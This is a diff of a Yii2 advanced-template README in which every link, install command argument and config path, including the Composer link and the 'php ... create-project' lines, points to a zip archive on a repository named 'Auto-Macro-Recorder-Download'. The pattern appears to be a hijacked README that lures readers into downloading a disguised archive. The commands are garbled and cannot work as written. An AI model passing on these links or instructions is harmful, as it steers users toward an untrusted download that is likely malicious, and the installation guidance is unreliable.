@@ -60,7 +60,7 @@ INSTALLATION
 
 ### Install from an Archive File
 
-Extract the archive file downloaded from [https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip) to
+Extract the archive file downloaded from [https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip) to
 a directory named `advanced` that is directly under the Web root.
 
 Then follow the instructions given in "GETTING STARTED".
@@ -68,14 +68,14 @@ Then follow the instructions given in "GETTING STARTED".
 
 ### Install via Composer
 
-If you do not have [Composer](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip), you may install it by following the instructions
-at [https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip).
+If you do not have [Composer](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip), you may install it by following the instructions
+at [https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip).
 
 You can then install the application using the following command:
 
 ~~~
-php https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip global require "fxp/composer-asset-plugin:1.0.0"
-php https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip create-project --prefer-dist --stability=dev yiisoft/yii2-app-advanced advanced
+php https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip global require "fxp/composer-asset-plugin:1.0.0"
+php https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip create-project --prefer-dist --stability=dev yiisoft/yii2-app-advanced advanced
 ~~~
 
 
@@ -86,7 +86,7 @@ After you install the application, you have to conduct the following steps to in
 the installed application. You only need to do these once for all.
 
 1. Run command `init` to initialize the application with a specific environment.
-2. Create a new database and adjust the `components['db']` configuration in `https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip` accordingly.
+2. Create a new database and adjust the `components['db']` configuration in `https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/tests/codeception/console/Macro_Recorder_Auto_Download_2.9.zip` accordingly.
 3. Apply migrations with console command `yii migrate`. This will create tables needed for the application to work.
 4. Set document roots of your Web server:
 
